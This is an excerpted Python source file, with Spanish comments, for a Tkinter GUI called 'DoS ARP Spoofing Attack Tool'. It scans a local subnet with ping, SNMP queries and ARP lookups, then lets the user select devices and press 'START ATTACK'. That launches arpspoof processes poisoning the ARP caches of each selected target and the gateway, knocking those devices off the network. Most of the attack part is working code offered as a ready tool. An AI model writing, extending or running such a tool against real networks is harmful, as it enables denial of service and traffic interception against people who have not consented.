...
class DoSApp:
    def __init__(self, root):
        ...
        self.gateway_ip = ""
        self.local_ip = ""
        self.attack_processes = []  # Lista para controlar procesos
    ...
    def detect_network_info(self):
        """Detecta automáticamente la IP local y gateway"""
        try:
            # Obtener IP local
    ...
    def create_widgets(self):
        ...
        # ASCII ART centrado (arriba de todo)
...
░▓ ▒░ ▒░  ░▒  ░░▓▒░ ░  ░▒▒ ░ ░▓ ░░ ▒░▒░▒░ 
 ...
 ░         ░             ░    ░      ░ ░ 
        ...
        ascii_label = tk.Label(ascii_frame, text=ascii_text, 
                              font=("Courier", 10), 
                              fg="red", bg="black", justify="center") 
        ascii_label.pack()
        
        # GitHub link centrado
        github_label = tk.Label(self.root, text="github.com/ImP4x/DoS-ARP-Spoofing-Tool.git", 
                               font=("Arial", 14), 
                               fg="#FFFFFF", bg="black")
        github_label.pack(pady=(0, 10))
        
        # Título del ataque a la izquierda, encima de Devices Found
        attack_title = tk.Label(self.root, text="DoS ARP Spoofing Attack Tool", 
                               font=("Arial", 16), 
                               fg="red", bg="black")
        attack_title.pack(anchor="w", padx=20, pady=(10, 5))
        
        # Frame para configuración de red (como Angry IP Scanner)
        ...
        # Botón scan
        self.scan_btn = tk.Button(ip_frame, text="Scan", bg="red", fg="black", 
                                 font=("Arial", 10, "bold"), command=self.scan_network,
                                 relief="flat", bd=0, highlightthickness=0)
        self.scan_btn.pack(side="right", padx=10)
        
        # Lista de dispositivos con botones de selección
        devices_frame = tk.Frame(self.root, bg="black")
        devices_frame.pack(pady=0, padx=20, fill="both", expand=True)
        
        # Frame para título y botones de selección
        selection_frame = tk.Frame(devices_frame, bg="black")
        selection_frame.pack(fill="x", pady=5)
        
        tk.Label(selection_frame, text="Devices Found:", 
                fg="white", bg="black", font=("Arial", 12, "bold")).pack(side="left")
        
        # Botones de selección
        self.select_all_btn = tk.Button(selection_frame, text="Select All", bg="#791402", fg="white", 
                                       font=("Arial", 9, "bold"), command=self.select_all_devices,
                                       relief="flat", bd=0, highlightthickness=0)
        self.select_all_btn.pack(side="right", padx=5)
        
        self.clear_selection_btn = tk.Button(selection_frame, text="Clear Selection", bg="#791402", fg="white", 
                                            font=("Arial", 9, "bold"), command=self.clear_selection,
                                            relief="flat", bd=0, highlightthickness=0)
        ...
        self.start_btn = tk.Button(buttons_frame, text="START ATTACK", bg="red", fg="black", 
                                  font=("Arial", 12, "bold"), width=15, command=self.start_attack,
                                  relief="flat", bd=0, highlightthickness=0)
        self.start_btn.pack(side="left", padx=10)
        
        self.stop_btn = tk.Button(buttons_frame, text="STOP ATTACK", bg="red", fg="black", 
                                 font=("Arial", 12, "bold"), width=15, command=self.stop_attack,
                                 relief="flat", bd=0, highlightthickness=0)
        ...
        tk.Label(logs_frame, text="Logs:", fg="white", bg="black", 
                font=("Arial", 12, "bold")).pack(anchor="w")
        
        self.log_text = scrolledtext.ScrolledText(logs_frame, height=8, bg="black", 
                                                 fg="lime", font=("Courier", 9),
                                                 relief="flat", bd=1)
        ...
        # Bind para selección múltiple con Ctrl
    ...
    def update_selected_devices(self):
        ...
        for item in selection:
            ...
            if values:
                self.selected_devices.append(values[0])  # IP
    ...
    def get_device_info(self, ip):
        """Obtener información completa del dispositivo usando múltiples métodos"""
        hostname = "Unknown"
        mac = "Unknown"
        ...
        # Método 3: SNMP (para dispositivos de red)
        if hostname == "Unknown":
            try:
                result = subprocess.run(['snmpget', '-v2c', '-c', 'public', ip, 'SNMPv2-MIB::sysName.0'], 
        ...
        # Método 4: ARP para MAC address
        try:
            # Ping primero para actualizar tabla ARP
        ...
        # Método 5: Identificar fabricante por MAC
    ...
    def get_vendor_from_mac(self, mac):
        """Obtener fabricante del dispositivo por MAC address"""
        vendors = {
            # Máquinas virtuales
            "00:50:56": "VMware",
            "08:00:27": "VirtualBox", 
            ...
            # Dispositivos especiales y genéricos
    ...
    def scan_single_ip(self, ip):
        """Escanear una sola IP con información mejorada"""
        try:
            # Ping rápido
            result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], 
                                   capture_output=True, text=True)
            if result.returncode == 0:
                hostname, mac = self.get_device_info(str(ip))
                return (str(ip), hostname, mac)
        except:
            pass
        return None
        ...
        def scan_thread():
            try:
                ...
                while current <= end_ip:
                    ip_range.append(current)
                    current += 1
                
                self.log(f"🛧 Escaneando rango: {start_ip} - {end_ip}")
                
                # Usar ThreadPoolExecutor para escaneo paralelo
                with ThreadPoolExecutor(max_workers=50) as executor:
                    results = list(executor.map(self.scan_single_ip, ip_range))
                ...
                self.log(f"☑ Escaneo completado. {len(self.devices)} dispositivos encontrados.")
    ...
    def start_attack(self):
        """Iniciar ataque ARP Spoofing con control mejorado"""
        ...
        self.log(f"➥ Objetivos: {', '.join(self.selected_devices)}")
        ...
        def attack_thread():
            for target_ip in self.selected_devices:
                if not self.attack_running:
                    break
                
                try:
                    # Crear procesos arpspoof separados para cada objetivo
                    proc1 = subprocess.Popen(['arpspoof', '-i', 'eth0', '-t', target_ip, self.gateway_ip])
                    proc2 = subprocess.Popen(['arpspoof', '-i', 'eth0', '-t', self.gateway_ip, target_ip])
                    
                    self.attack_processes.extend([proc1, proc2])
                    self.log(f"☠ Ataque iniciado contra {target_ip}")
                    
                except Exception as e:
                    self.log(f"✘ Error iniciando ataque a {target_ip}: {str(e)}")
            
            # Monitorear estado del ataque
            while self.attack_running:
                time.sleep(1)
                # Verificar que los procesos sigan activos
                for proc in self.attack_processes[:]:
                    if proc.poll() is not None:
                        self.attack_processes.remove(proc)
        
        threading.Thread(target=attack_thread, daemon=True).start()
    
    def stop_attack(self):
        """Detener ataque INMEDIATAMENTE"""
        self.log("⌦ DETENIENDO ATAQUE INMEDIATAMENTE...")
        
        # Marcar como detenido
        self.attack_running = False
        
        # Terminar todos los procesos arpspoof INMEDIATAMENTE
        for proc in self.attack_processes:
            try:
                proc.terminate()  # Terminar proceso
                proc.wait(timeout=2)  # Esperar máximo 2 segundos
            except:
                try:
        ...
        # Restaurar tabla ARP rápidamente
        def restore_thread():
            self.log("✉ Enviando paquetes de restauración ARP...")
            for target_ip in self.selected_devices:
                try:
                    # Restaurar ARP más rápido
                    subprocess.run(['arping', '-c', '2', '-A', '-I', 'eth0', target_ip], 
                                 capture_output=True, timeout=5)
                    self.log(f"✔ ARP restaurado para {target_ip}")
                except Exception as e:
                    self.log(f"☢  Error restaurando {target_ip}: {str(e)}")
            
            self.log("✔ ATAQUE DETENIDO COMPLETAMENTE")
        
        # Restaurar UI inmediatamente
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        
        # Restaurar ARP en segundo plano
    ...
    def on_closing(self):
        ...
        if self.attack_running:
            ...
            self.stop_attack()
            time.sleep(1)  # Dar tiempo para detener
